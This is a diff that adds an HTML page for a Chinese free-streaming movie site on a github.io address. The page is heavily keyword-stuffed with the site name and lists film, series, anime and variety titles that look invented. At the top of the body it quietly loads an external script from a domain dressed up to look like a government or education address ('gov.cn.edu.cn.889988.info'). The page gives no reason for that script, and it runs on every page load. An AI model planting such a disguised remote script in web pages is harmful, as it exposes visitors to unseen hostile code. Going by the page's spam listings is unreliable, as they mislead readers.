@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>草民电影网在线观看 - 高清电影电视剧动漫综艺免费在线看</title>
+<meta name="description" content="草民电影网在线观看提供高清电影、热播电视剧、人气动漫、爆款综艺免费在线观看，草民电影网在线观看，手机电脑都能看。">
+<meta name="keywords" content="草民电影网在线观看,免费电影在线观看,高清影视,热播电视剧,人气动漫,爆款综艺">
+<meta name="author" content="草民电影网在线观看">
+<link rel="canonical" href="https://caomindianyingwangzaixianguankan-h5.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  background:#06120f;
+  color:#e8f5ef;
+  line-height:1.7;
+}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+
+/* 导航：暗绿赛博 */
+.nav{
+  position:sticky;top:0;z-index:99;
+  background:rgba(6,18,15,.9);
+  backdrop-filter:blur(10px);
+  border-bottom:1px solid #14352b;
+}
+.nav__box{
+  max-width:1200px;margin:0 auto;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:.8rem 1rem;flex-wrap:wrap;gap:.5rem;
+}
+.nav__logo{font-weight:900;font-size:1.25rem;color:#3df0a8}
+.nav__logo b{color:#fff}
+.nav__links{display:flex;gap:.35rem;flex-wrap:wrap}
+.nav__links a{
+  padding:.4rem .8rem;border-radius:999px;
+  font-size:.88rem;color:#9fd8c4;transition:.25s;
+}
+.nav__links a:hover{background:#103a2c;color:#3df0a8}
+
+/* Hero：斜切背景 */
+.hero{
+  max-width:1200px;margin:2rem auto;padding:0 1rem;
+}
+.hero__card{
+  border-radius:26px;overflow:hidden;
+  background:
+    linear-gradient(115deg,#0c2b22 0%,#0f5132 45%,#198754 100%);
+  display:grid;grid-template-columns:1.2fr .8fr;
+  position:relative;
+}
+.hero__card::after{
+  content:"";position:absolute;right:-40px;top:-40px;
+  width:220px;height:220px;border-radius:50%;
+  background:radial-gradient(circle,rgba(61,240,168,.35),transparent 70%);
+}
+.hero__left{padding:3rem 2rem;position:relative;z-index:1}
+.hero__tag{
+  display:inline-block;font-size:.75rem;letter-spacing:2px;
+  border:1px solid rgba(61,240,168,.5);color:#3df0a8;
+  padding:.2rem .8rem;border-radius:999px;margin-bottom:1rem;
+}
+.hero h1{font-size:clamp(2rem,5vw,3.2rem);line-height:1.15;margin-bottom:1rem}
+.hero h1 em{font-style:normal;color:#3df0a8}
+.hero p{color:rgba(232,245,239,.8);max-width:520px;margin-bottom:1.6rem}
+.hero__btn{
+  display:inline-block;background:#3df0a8;color:#06120f;
+  font-weight:800;padding:.8rem 2rem;border-radius:999px;
+}
+.hero__right{
+  display:flex;align-items:center;justify-content:center;
+  font-size:7rem;filter:drop-shadow(0 10px 30px rgba(0,0,0,.4));
+}
+
+/* 通用 */
+.wrap{max-width:1200px;margin:3.5rem auto;padding:0 1rem}
+.head{display:flex;align-items:baseline;gap:1rem;margin-bottom:1.5rem}
+.head h2{font-size:1.6rem}
+.head h2 span{color:#3df0a8}
+.head a{margin-left:auto;color:#7fc9b3;font-size:.85rem}
+
+/* 栏目1：电影——胶片横滚 */
+.film-roll{
+  display:flex;gap:1.2rem;overflow-x:auto;padding-bottom:1rem;
+  scroll-snap-type:x mandatory;
+}
+.film-roll::-webkit-scrollbar{height:8px}
+.film-roll::-webkit-scrollbar-thumb{background:#198754;border-radius:4px}
+.reel{
+  min-width:260px;height:360px;border-radius:18px;position:relative;
+  scroll-snap-align:start;overflow:hidden;flex:none;
+}
+.reel__bg{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:3.5rem}
+.reel__mask{position:absolute;inset:0;background:linear-gradient(to top,rgba(0,0,0,.85),transparent 65%)}
+.reel__txt{position:absolute;left:0;right:0;bottom:0;padding:1.2rem}
+.reel__txt h3{font-size:1.05rem;margin-bottom:.2rem}
+.reel__txt p{font-size:.8rem;color:rgba(255,255,255,.75)}
+
+/* 栏目2：电视剧——左大图右进度列表 */
+.tv-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:1.5rem}
+.tv-hero{
+  border-radius:20px;min-height:420px;color:#fff;position:relative;overflow:hidden;
+  display:flex;align-items:flex-end;padding:2rem;
+}
+.tv-hero__mask{position:absolute;inset:0;background:linear-gradient(to top,rgba(0,0,0,.8),transparent 70%)}
+.tv-hero__c{position:relative;z-index:1}
+.tv-hero__c h3{font-size:1.7rem;margin-bottom:.4rem}
+.tv-hero__c p{color:rgba(255,255,255,.8);margin-bottom:1rem}
+.tv-hero__c a{background:#3df0a8;color:#06120f;padding:.5rem 1.4rem;border-radius:999px;font-weight:700}
+.tv-list{display:flex;flex-direction:column;gap:.7rem}
+.tv-item{
+  background:#0c241d;border:1px solid #14352b;border-radius:14px;
+  padding:.7rem .9rem;display:flex;align-items:center;gap:.8rem;
+}
+.tv-item__ic{width:46px;height:46px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:1.3rem;color:#fff;flex:none}
+.tv-item h4{font-size:.95rem}
+.tv-item small{color:#7fc9b3}
+.tv-item em{margin-left:auto;font-style:normal;color:#3df0a8;font-weight:700;font-size:.8rem}
+
+/* 栏目3：动漫——六边形网格 */
+.anime-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:1.2rem;
+}
+.hex{
+  aspect-ratio:1/1;clip-path:polygon(50% 0,100% 25%,100% 75%,50% 100%,0 75%,0 25%);
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  color:#fff;text-align:center;padding:1rem;transition:.3s;cursor:pointer;
+}
+.hex:hover{transform:scale(1.05)}
+.hex b{font-size:.95rem}
+.hex small{font-size:.72rem;opacity:.85}
+
+/* 栏目4：综艺——卡片时间轴 */
+.var-flow{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1.2rem}
+.var-card{
+  background:#0c241d;border:1px solid #14352b;border-radius:18px;padding:1.3rem;
+  position:relative;
+}
+.var-card__time{color:#3df0a8;font-weight:700;font-size:.8rem}
+.var-card h4{margin:.3rem 0;font-size:1.05rem}
+.var-card p{color:#9fd8c4;font-size:.86rem}
+
+/* 栏目5：热播榜——序号列表 */
+.rank{display:flex;flex-direction:column;gap:.7rem}
+.rk{
+  display:flex;align-items:center;gap:1rem;
+  background:#0c241d;border:1px solid #14352b;border-radius:14px;padding:.8rem 1rem;
+}
+.rk__no{font-size:1.6rem;font-weight:900;color:#3df0a8;width:42px;text-align:center;flex:none}
+.rk h4{font-size:.98rem}
+.rk small{color:#7fc9b3}
+
+/* 页脚 */
+.foot{
+  margin-top:4rem;background:#04100c;color:#9fd8c4;text-align:center;padding:2.5rem 1rem;
+  border-top:1px solid #14352b;
+}
+.foot b{color:#fff}
+.foot a{color:#3df0a8;margin:0 .4rem}
+.foot small{display:block;margin-top:.8rem;color:#5e8c7c}
+
+@media(max-width:880px){
+  .hero__card{grid-template-columns:1fr}
+  .hero__right{min-height:150px;font-size:4.5rem}
+  .tv-grid{grid-template-columns:1fr}
+}
+@media(max-width:560px){
+  .nav__box{justify-content:center}
+  .head h2{font-size:1.3rem}
+  .reel{min-width:220px;height:320px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 导航 -->
+<header class="nav">
+  <div class="nav__box">
+    <div class="nav__logo">草民<b>电影网在线观看</b></div>
+    <nav class="nav__links">
+      <a href="#film">电影</a>
+      <a href="#tv">电视剧</a>
+      <a href="#anime">动漫</a>
+      <a href="#variety">综艺</a>
+      <a href="#rank">热播榜</a>
+    </nav>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="hero__card">
+    <div class="hero__left">
+      <span class="hero__tag">CAOMIN MOVIE · 在线观看</span>
+      <h1>草民电影网在线观看<br><em>高清影视 免费看</em></h1>
+      <p>草民电影网在线观看聚合最新电影、热播剧、国漫日漫、爆款综艺，手机端自适应，打开就能看。</p>
+      <a href="#film" class="hero__btn">进入片库 ›</a>
+    </div>
+    <div class="hero__right">🎬</div>
+  </div>
+</section>
+
+<!-- 栏目1：电影 -->
+<section class="wrap" id="film">
+  <div class="head"><h2>最新<span>电影</span></h2><a href="#">更多 ›</a></div>
+  <div class="film-roll">
+    <article class="reel">
+      <div class="reel__bg" style="background:linear-gradient(135deg,#0f5132,#3df0a8)">🎬</div>
+      <div class="reel__mask"></div>
+      <div class="reel__txt"><h3>草民电影网在线观看：夜行镖局</h3><p>武侠 / 126分钟</p></div>
+    </article>
+    <article class="reel">
+      <div class="reel__bg" style="background:linear-gradient(135deg,#198754,#0c2b22)">🎬</div>
+      <div class="reel__mask"></div>
+      <div class="reel__txt"><h3>星轨彼岸</h3><p>科幻 / 148分钟</p></div>
+    </article>
+    <article class="reel">
+      <div class="reel__bg" style="background:linear-gradient(135deg,#3df0a8,#0f5132)">🎬</div>
+      <div class="reel__mask"></div>
+      <div class="reel__txt"><h3>城中旧雨</h3><p>文艺 / 117分钟</p></div>
+    </article>
+    <article class="reel">
+      <div class="reel__bg" style="background:linear-gradient(135deg,#0c2b22,#198754)">🎬</div>
+      <div class="reel__mask"></div>
+      <div class="reel__txt"><h3>铁拳无名</h3><p>动作 / 109分钟</p></div>
+    </article>
+    <article class="reel">
+      <div class="reel__bg" style="background:linear-gradient(135deg,#0f5132,#04361f)">🎬</div>
+      <div class="reel__mask"></div>
+      <div class="reel__txt"><h3>长安灯晚</h3><p>古装 / 139分钟</p></div>
+    </article>
+  </div>
+</section>
+
+<!-- 栏目2：电视剧 -->
+<section class="wrap" id="tv">
+  <div class="head"><h2>热播<span>电视剧</span></h2><a href="#">更多 ›</a></div>
+  <div class="tv-grid">
+    <article class="tv-hero" style="background:linear-gradient(135deg,#0f5132,#04361f)">
+      <div class="tv-hero__mask"></div>
+      <div class="tv-hero__c">
+        <h3>草民电影网在线观看独播：市井英雄传</h3>
+        <p>小人物大江湖，42集全，市井气浓、剧情扎实。</p>
+        <a href="#">立即追剧</a>
+      </div>
+    </article>
+    <div class="tv-list">
+      <div class="tv-item">
+        <div class="tv-item__ic" style="background:#198754">📺</div>
+        <div><h4>春风衙门</h4><small>古装探案 / 36集</small></div>
+        <em>更新28</em>
+      </div>
+      <div class="tv-item">
+        <div class="tv-item__ic" style="background:#0f5132">📺</div>
+        <div><h4>霓虹之下</h4><small>都市 / 30集</small></div>
+        <em>已完结</em>
+      </div>
+      <div class="tv-item">
+        <div class="tv-item__ic" style="background:#3df0a8;color:#06120f">📺</div>
+        <div><h4>山海驿路</h4><small>玄幻 / 40集</small></div>
+        <em>更新33</em>
+      </div>
+      <div class="tv-item">
+        <div class="tv-item__ic" style="background:#04361f">📺</div>
+        <div><h4>旧厂故事</h4><small>年代 / 48集</small></div>
+        <em>已完结</em>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目3：动漫 -->
+<section class="wrap" id="anime">
+  <div class="head"><h2>人气<span>动漫</span></h2><a href="#">更多 ›</a></div>
+  <div class="anime-grid">
+    <div class="hex" style="background:linear-gradient(135deg,#0f5132,#3df0a8)"><b>草莽剑歌</b><small>国漫·热血</small></div>
+    <div class="hex" style="background:linear-gradient(135deg,#198754,#04361f)"><b>东京巷陌</b><small>日漫·悬疑</small></div>
+    <div class="hex" style="background:linear-gradient(135deg,#3df0a8,#0c2b22)"><b>猫仔食堂</b><small>日常·治愈</small></div>
+    <div class="hex" style="background:linear-gradient(135deg,#04361f,#198754)"><b>九州怪谈录</b><small>国漫·志怪</small></div>
+    <div class="hex" style="background:linear-gradient(135deg,#0f5132,#04361f)"><b>机甲草图</b><small>科幻·机战</small></div>
+    <div class="hex" style="background:linear-gradient(135deg,#3df0a8,#0f5132)"><b>深海渔火</b><small>奇幻·音乐</small></div>
+  </div>
+</section>
+
+<!-- 栏目4：综艺 -->
+<section class="wrap" id="variety">
+  <div class="head"><h2>爆款<span>综艺</span></h2><a href="#">更多 ›</a></div>
+  <div class="var-flow">
+    <article class="var-card">
+      <div class="var-card__time">周六 20:00</div>
+      <h4>草民电影网在线观看同步：街头戏班</h4>
+      <p>普通人即兴演戏，笑点和泪点都够真。</p>
+    </article>
+    <article class="var-card">
+      <div class="var-card__time">周五 21:00</div>
+      <h4>赶海日记</h4>
+      <p>海边生存+美食，镜头质感很舒服。</p>
+    </article>
+    <article class="var-card">
+      <div class="var-card__time">周日 20:30</div>
+      <h4>老歌新唱</h4>
+      <p>经典老歌重新编曲，舞台制作在线。</p>
+    </article>
+    <article class="var-card">
+      <div class="var-card__time">周三 22:00</div>
+      <h4>深夜片场</h4>
+      <p>导演聊拍片幕后，影迷向综艺。</p>
+    </article>
+  </div>
+</section>
+
+<!-- 栏目5：热播榜 -->
+<section class="wrap" id="rank">
+  <div class="head"><h2>今日<span>热播榜</span></h2><a href="#">更多 ›</a></div>
+  <div class="rank">
+    <div class="rk"><div class="rk__no">1</div><div><h4>夜行镖局</h4><small>电影·武侠</small></div></div>
+    <div class="rk"><div class="rk__no">2</div><div><h4>市井英雄传</h4><small>电视剧·古装</small></div></div>
+    <div class="rk"><div class="rk__no">3</div><div><h4>草莽剑歌</h4><small>动漫·热血</small></div></div>
+    <div class="rk"><div class="rk__no">4</div><div><h4>街头戏班</h4><small>综艺·喜剧</small></div></div>
+    <div class="rk"><div class="rk__no">5</div><div><h4>星轨彼岸</h4><small>电影·科幻</small></div></div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer class="foot">
+  <div><b>草民电影网在线观看</b> · 高清影视自由看</div>
+  <div style="margin-top:.6rem">
+    <a href="#film">电影</a>|
+    <a href="#tv">电视剧</a>|
+    <a href="#anime">动漫</a>|
+    <a href="#variety">综艺</a>|
+    <a href="#">关于</a>|
+    <a href="#">声明</a>
+  </div>
+  <small>官网：https://caomindianyingwangzaixianguankan-h5.github.io</small>
+  <small>© 2025 草民电影网在线观看 保留所有权利</small>
+</footer>
+
+</body>
+</html>
